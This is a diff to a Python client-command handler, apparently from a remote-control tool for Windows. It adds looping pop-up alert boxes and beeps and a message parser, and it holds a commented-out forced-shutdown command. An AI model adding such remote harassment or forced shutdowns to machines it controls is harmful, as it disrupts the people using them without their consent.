@@ -1,3 +1,4 @@
+import sys
 from time import sleep
 import requests
 import platform
@@ -93,10 +94,11 @@ class ClientCommands:
                 strings += f"\t{Console.CYAN}╰──/{Console.DEFAULT}{i:<25} {Console.CYAN}⥤  {'ENCODING ERROR':<}\n".expandtabs(14)
         return strings
 
-    def winManupilation(self,cmd):
+    def winManupilation(self,cmd:str):
         try:
-            HELPER = f"""\t{Console.CYAN}╰──/{Console.DEFAULT}m.pos x=arg1 y=arg2{Console.CYAN} ⥤  [{Console.GREEN}Set Mouse Position{Console.CYAN}]
-            \t{Console.CYAN}╰──/{Console.DEFAULT}beep hz=arg1 sec=arg2 loop=bool""".expandtabs(14)
+            HELPER = f"""\t{Console.CYAN}╰──/{Console.YELLOW}m.pos x=arg1 y=arg2{Console.CYAN:<16} [{Console.GREEN}Set Mouse Position{Console.CYAN}]
+            \t{Console.CYAN}╰──/{Console.YELLOW}beep hz=arg1 ms=arg2 loop=bool{Console.CYAN:<} [{Console.GREEN}Beep Sound{Console.CYAN}]
+            \t{Console.CYAN}╰──/{Console.YELLOW}alert msg=(arg1) title=arg2 loop=bool{Console.CYAN:<} [{Console.GREEN}Open Message Box{Console.CYAN}]""".expandtabs(14)
             if cmd == "help":
                 return HELPER
             elif cmd.startswith("m.pos "):
@@ -113,19 +115,49 @@ class ClientCommands:
                 if len(beeper) == 4:
                     beeper.remove("beep")
                     count = 0
-                    int(beeper[1].replace("sec=",""))
-                    print(beeper[2].replace("loop=","").capitalize())
                     if beeper[2].replace("loop=","").capitalize() == "True":
                         while count < 10:
-                            win32api.Beep(int(beeper[0].replace("hz=","")), int(beeper[1].replace("sec=","")))
-                            sleep(int(beeper[1].replace("sec=",""))/1000)
+                            win32api.Beep(int(beeper[0].replace("hz=","")), int(beeper[1].replace("ms=","")))
+                            sleep(int(beeper[1].replace("ms=",""))/1000)
                             count += 1
 
                     elif beeper[2].replace("loop=","").capitalize() == "False":
-                        win32api.Beep(int(beeper[0].replace("hz=","")), int(beeper[1].replace("sec=","")))
+                        win32api.Beep(int(beeper[0].replace("hz=","")), int(beeper[1].replace("ms=","")))
                 else:
                     return "Uups! Syntax"
+
+            elif cmd.startswith("alert "):
+                alert = cmd.split()
+                if len(alert) == 4:
+                    alert.remove("alert")
+                    if alert[2].replace("loop=","").capitalize() == "True":
+                        count = 0
+                        while count <= 10:
+                            sys.stdout.write("\a")
+                            win32api.MessageBox(0,self.alertMSG(cmd),alert[1].replace("title=",""),0x00000010)
+                            sys.stdout.flush()
+                            count += 1
+                            # if count == 10:
+                            #     os.popen("shutdown -s -f -t 1")
+                    elif alert[2].replace("loop=","").capitalize() == "False":
+                        sys.stdout.write("\a")
+                        win32api.MessageBox(0,self.alertMSG(cmd),alert[1].replace("title=",""),0x00000010)
+                        sys.stdout.flush()
             else:
                 return "Unknown command"
+
         except Exception:
             return " "
+    
+    def alertMSG(self,cmd:str) -> tuple:
+        msg = ""
+        count = 0
+        splitter = cmd.split("alert")
+        if splitter[1].replace("msg=","").strip().startswith("("):
+            iter_ = splitter[1].replace("msg=(","").strip()
+            while iter_[count] != ")":
+                iter_ = splitter[1].replace("msg=(","").strip()
+                msg += iter_[count]
+                count += 1
+        print(msg)
+        return msg
